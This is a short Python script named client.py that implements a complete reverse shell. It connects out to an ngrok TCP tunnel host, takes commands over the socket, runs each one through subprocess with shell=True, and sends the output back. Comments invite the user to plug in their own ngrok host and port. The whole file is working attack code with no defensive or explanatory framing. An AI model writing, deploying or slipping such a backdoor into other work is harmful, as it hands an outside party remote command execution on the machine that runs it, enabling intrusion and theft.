# client.py
import socket
import subprocess

HOST = '0.tcp.ap.ngrok.io'  # Replace with your ngrok TCP host
PORT = 10266              # Replace with ngrok port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    data = s.recv(1024).decode()
    if data.lower() in ["exit", "quit"]:
        break
    if data.strip() == "":
        continue
    # Execute command and send output
    try:
        output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    s.send(output)

s.close()
